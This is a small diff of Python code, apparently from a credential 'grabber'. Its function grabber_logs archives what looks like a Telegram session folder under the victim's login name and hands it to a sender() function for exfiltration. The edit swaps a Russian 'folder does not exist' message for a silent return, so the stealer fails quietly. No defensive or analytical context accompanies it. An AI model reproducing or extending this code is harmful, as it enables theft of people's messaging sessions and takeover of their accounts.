@@ -25,7 +25,7 @@ def grabber_logs():
         tdata_path = shutil.make_archive(f'{os.getlogin()}_session', 'zip', file)
         sender(tdata_path)
     else:
-        print("Папка не существует!")
+        return
 
 
 def sender(path):
